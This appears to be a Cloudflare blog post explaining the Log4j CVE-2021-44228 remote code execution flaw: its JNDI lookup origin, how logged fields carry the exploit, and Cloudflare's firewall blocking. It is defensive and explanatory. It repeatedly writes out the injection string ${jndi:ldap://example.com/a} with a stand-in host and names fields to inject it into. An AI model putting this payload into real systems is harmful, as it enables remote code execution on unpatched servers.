The Apache Log4j project has updated their official guidance and we have updated this blog post in line with their recommendations</i></p><p>Yesterday, December 9, 2021, a very serious vulnerability in the popular Java-based logging package <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228\">Log4j</a> was disclosed. This vulnerability allows an attacker to execute code on a remote server; a so-called <a href=\"https://www.cloudflare.com/learning/security/what-is-remote-code-execution/\">Remote Code Execution (RCE)</a>. Because of the widespread use of Java and Log4j this is likely one of the most serious vulnerabilities on the Internet since both <a href=\"/tag/heartbleed/\">Heartbleed</a> and <a href=\"/inside-shellshock/\">ShellShock</a>.</p><p>It is <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228\">CVE-2021-44228</a> and affects version 2 of Log4j between versions 2.0-beta-9 and 2.14.1. It is patched in 2.16.0.</p><p>In this post we explain the history of this vulnerability, how it was introduced, how Cloudflare is protecting our clients. <a href=\"/actual-cve-2021-44228-payloads-captured-in-the-wild/\">Details of actual attempted exploitation</a> we are seeing blocked by our firewall service are in a separate blog post.</p><p>Cloudflare uses some Java-based software and our teams worked to ensure that our systems were not vulnerable or that this vulnerability was mitigated.

To understand how that change creates a problem, it’s necessary to understand a little about <a href=\"https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface\">JNDI</a>: Java Naming and Directory Interface.</p><p>JNDI has been present in Java since the late 1990s. It is a directory service that allows a Java program to find data (in the form of a Java object) through a directory. JNDI has a number of service provider interfaces (SPIs) that enable it to use a variety of directory services.</p><p>For example, SPIs exist for the CORBA COS (Common Object Service), the Java RMI (Remote Method Interface) Registry and LDAP. LDAP is a very popular directory service (the Lightweight Directory Access Protocol) and is the primary focus of CVE-2021-44228 (although other SPIs could potentially also be used).</p><p>A Java program can use JNDI and LDAP together to find a Java object containing data that it might need. For example, in the standard Java documentation there’s an <a href=\"https://docs.oracle.com/javase/jndi/tutorial/getStarted/examples/directory.html\">example</a> that talks to an LDAP server to retrieve attributes from an object. It uses the URL <code>ldap://localhost:389/o=JNDITutorial</code> to find the JNDITutorial object from an LDAP server running on the same machine (localhost) on port 389 and goes on to read attributes from it.</p><p>As the tutorial says “<i>If your LDAP server is located on another machine or is using another port, then you need to edit the LDAP URL</i>”. Thus the LDAP server could be running on a different machine and potentially anywhere on the Internet. That flexibility means that if an attacker could control the LDAP URL they’d be able to cause a Java program to load an object from a server under their control.</p><p>That’s the basics of JNDI and LDAP; a useful part of the Java ecosystem.</p><p>But in the case of Log4j an attacker can control the LDAP URL by causing Log4j to try to write a string like <code>${jndi:ldap://example.com/a}</code>. If that happens then Log4j will connect to the LDAP server at example.com and retrieve the object.</p><p>This happens because Log4j contains <a href=\"https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution\">special syntax</a> in the form <code>${prefix:name}</code> where <code>prefix</code> is one of a number of different <a href=\"https://logging.apache.org/log4j/2.x/manual/lookups.html\">Lookups</a> where <code>name</code> should be evaluated. For example, <code>${java:version}</code> is the current running version of Java.</p><p><a href=\"https://issues.apache.org/jira/browse/LOG4J2-313\">LOG4J2-313</a> added a <code>jndi</code> Lookup as follows: “The JndiLookup allows variables to be retrieved via JNDI. By default the key will be prefixed with java:comp/env/, however if the key contains a &quot;:&quot; no prefix will be added.”</p><p>With a : present in the key, as in <code>${jndi:ldap://example.com/a}</code> there’s no prefix and the LDAP server is queried for the object. And these Lookups can be used in both the configuration of Log4j as well as when lines are logged.</p><p>So all an attacker has to do is find some input that gets logged and add something like  <code>${jndi:ldap://example.com/a}</code>. This could be a common HTTP header like <code>User-Agent</code> (that commonly gets logged) or perhaps a form parameter like <code>username</code> that might also be logged.</p><p>This is likely very common in Java-based Internet facing software that uses Log4j. More insidious is that non-Internet facing software that uses Java can also be exploitable as data gets passed from system to system.</p><p>For example, a User-Agent string containing the exploit could be passed to a backend system written in Java that does indexing or data science and the exploit could get logged. This is why it is vital that all Java-based software that uses Log4j version 2 is patched or has mitigations applied immediately. Even if the Internet-facing software is not written in Java it is possible that strings get passed to other systems that are in Java allowing the exploit to happen.</p>\n            <figure class=\"kg-card kg-image-card kg-width-wide\">\n            \n            <Image src=\"https://cf-assets.www.cloudflare.com/slt3lc6tev37/4gTLQSjXHxMPpuJw2IHAEj/b2b2fa00cda32b51350817f683b53362/Exploit-activated.png\" alt=\"Even if the Internet-facing software is not written in Java it is possible that strings get passed to other systems that are in Java allowing the exploit to happen.\" class=\"kg-image\" width=\"1268\" height=\"338\" loading=\"lazy\"/>\n            \n            </figure><p>Or imagine a Java-based billing system that logs when the customer&#39;s first name is not found. A malicious user might create an order with a first name that contains the exploit, and it might take multiple hops (and a lot of time) to make it from the web server, via a customer database and into the billing system where it finally executes.</p><p>And Java is used for many more systems than just those that are Internet facing. For example, it’s not hard to imagine a package handling system that scans QR codes on boxes, or a contactless door key both being vulnerable if they are written in Java and use Log4j. In one case a carefully crafted QR code might contain a postal address containing the exploit string; in the other a carefully programmed door key could contain the exploit and be logged by a system that keeps track of entries and exits.</p><p>And systems that do periodic work might pick up the exploit and log it later. So the exploit could lay dormant until some indexing, roll-up, or archive process written in Java inadvertently logs the bad string. Hours or even days later.</p>\n          <div class=\"flex anchor relative\">\n            <h3 id=\"cloudflare-firewall-protection\">Cloudflare Firewall Protection</h3>\n            <a href=\"#cloudflare-firewall-protection\" aria-hidden=\"true\" class=\"relative sm:absolute sm:-left-5\">\n              <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\"><path fill=\"currentcolor\" d=\"m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z\"></path></svg>\n            </a>\n          </div>\n        <p>Cloudflare rolled out protection for our customers using our <a href=\"https://www.cloudflare.com/waf/\">Firewall</a> in the form of rules that block the <code>jndi</code> Lookup in common locations in an HTTP request.
